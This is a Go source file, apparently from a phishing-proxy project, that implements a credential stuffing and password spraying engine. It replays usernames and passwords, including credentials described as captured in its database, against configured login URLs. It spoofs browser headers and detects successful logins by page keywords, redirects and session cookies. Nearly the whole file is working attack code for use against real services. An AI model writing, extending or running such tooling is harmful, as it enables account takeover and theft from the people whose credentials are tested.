package credentialstuffing

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"go.uber.org/zap"
)

// TargetService represents a service to test credentials against
type TargetService struct {
	ID       string
	Name     string
	LoginURL string
	Enabled  bool
}

// StuffingResult result of credential check
type StuffingResult struct {
	CredentialID string
	ServiceID    string
	Success      bool
	StatusCode   int
	Error        string
	CheckedAt    time.Time
}

// Config credential stuffing configuration
type Config struct {
	Enabled        bool
	TargetServices []TargetService
	RateLimit      int           // requests per minute
	DelayBetween   time.Duration // delay between attempts
}

// Engine runs credential stuffing checks
type Engine struct {
	config    *Config
	db        *database.Database
	logger    *zap.Logger
	httpClient *http.Client
	mu        sync.Mutex
}

// NewEngine creates credential stuffing engine
func NewEngine(cfg *Config, db *database.Database, logger *zap.Logger) *Engine {
	return &Engine{
		config: cfg,
		db: db,
		logger: logger,
		httpClient: &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // Don't follow redirects
			},
			Timeout: 30 * time.Second,
		},
	}
}

// AttackParams параметры для атаки
type AttackParams struct {
	UsernameField string // email, login, username
	PasswordField string
	SuccessIndicators []string // "Dashboard", "Welcome", "success"
	FailureIndicators []string // "Invalid", "incorrect", "failed"
}

// RunAttack выполняет password spraying атаку
func (e *Engine) RunAttack(ctx context.Context, service TargetService, usernames, passwords []string, params AttackParams) ([]StuffingResult, error) {
	results := []StuffingResult{}
	
	for _, username := range usernames {
		for _, password := range passwords {
			result, err := e.attemptLogin(ctx, service, username, password, params)
			if err != nil {
				e.logger.Warn("Login attempt failed", zap.Error(err))
				continue
			}
			results = append(results, *result)
			
			// Rate limiting
			time.Sleep(e.config.DelayBetween)
		}
	}
	
	return results, nil
}

// attemptLogin делает попытку логина
func (e *Engine) attemptLogin(ctx context.Context, service TargetService, username, password string, params AttackParams) (*StuffingResult, error) {
	// Формируем данные
	data := url.Values{}
	data.Set(params.UsernameField, username)
	data.Set(params.PasswordField, password)

	req, err := http.NewRequestWithContext(ctx, "POST", service.LoginURL, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return &StuffingResult{
			Success: false,
			Error: err.Error(),
			CheckedAt: time.Now(),
		}, nil
	}
	defer resp.Body.Close()

	// Проверяем индикаторы
	body := "" // Would read body in production

	success := false
	for _, indicator := range params.SuccessIndicators {
		if strings.Contains(body, indicator) {
			success = true
			break
		}
	}

	return &StuffingResult{
		CredentialID: fmt.Sprintf("%s:%s", username, service.ID),
		ServiceID: service.ID,
		Success: success,
		StatusCode: resp.StatusCode,
		CheckedAt: time.Now(),
	}, nil
}

// TestSingleCredential тестирует один креденшал
func (e *Engine) TestSingleCredential(ctx context.Context, service TargetService, username, password string) (*StuffingResult, error) {
	params := AttackParams{
		UsernameField: "email",
		PasswordField: "password",
		SuccessIndicators: []string{"Dashboard", "Welcome", "success"},
		FailureIndicators: []string{"Invalid", "incorrect"},
	}
	
	return e.attemptLogin(ctx, service, username, password, params)
}

// CheckCredential tests credential against a service
func (e *Engine) CheckCredential(ctx context.Context, cred *database.Credentials, service TargetService) (*StuffingResult, error) {
	if !e.config.Enabled {
		return nil, nil
	}

	e.mu.Lock()
	// Rate limiting
	time.Sleep(e.config.DelayBetween)
	e.mu.Unlock()

	// Формируем данные для POST запроса
	data := url.Values{}
	data.Set("email", cred.Username)
	data.Set("password", cred.Password)

	req, err := http.NewRequestWithContext(ctx, "POST", service.LoginURL, strings.NewReader(data.Encode()))
	if err != nil {
		return &StuffingResult{
			CredentialID: cred.ID,
			ServiceID:    service.ID,
			Success:      false,
			Error:        err.Error(),
			CheckedAt:    time.Now(),
		}, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return &StuffingResult{
			CredentialID: cred.ID,
			ServiceID:    service.ID,
			Success:      false,
			Error:        err.Error(),
			CheckedAt:    time.Now(),
		}, nil
	}
	defer resp.Body.Close()

	// Читаем тело ответа
	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	// Проверяем индикаторы успеха
	success := false
	successIndicators := []string{"Dashboard", "Welcome", "success", "logged in", "logout"}
	for _, indicator := range successIndicators {
		if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)) {
			success = true
			break
		}
	}

	// Проверяем по статус коду и редиректам
	if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusSeeOther {
		// Редирект обычно означает успешный логин
		success = true
	}

	// Проверяем cookies
	hasSessionCookie := false
	for _, cookie := range resp.Cookies() {
		if strings.Contains(strings.ToLower(cookie.Name), "session") ||
			strings.Contains(strings.ToLower(cookie.Name), "auth") ||
			strings.Contains(strings.ToLower(cookie.Name), "token") {
			hasSessionCookie = true
			break
		}
	}

	if hasSessionCookie {
		success = true
	}

	e.logger.Info("Credential checked",
		zap.String("service", service.Name),
		zap.String("username", cred.Username),
		zap.Bool("success", success),
		zap.Int("status", resp.StatusCode))

	return &StuffingResult{
		CredentialID: cred.ID,
		ServiceID:    service.ID,
		Success:      success,
		StatusCode:   resp.StatusCode,
		CheckedAt:    time.Now(),
	}, nil
}

// CheckAllCredentials runs stuffing for all captured creds against configured services
func (e *Engine) CheckAllCredentials(ctx context.Context) ([]StuffingResult, error) {
	if !e.config.Enabled {
		return nil, nil
	}
	creds, err := e.db.ListCredentials(1000, 0)
	if err != nil {
		return nil, err
	}
	var results []StuffingResult
	for _, cred := range creds {
		for _, svc := range e.config.TargetServices {
			if !svc.Enabled {
				continue
			}
			res, err := e.CheckCredential(ctx, cred, svc)
			if err != nil {
				continue
			}
			if res != nil {
				results = append(results, *res)
			}
		}
	}
	return results, nil
}
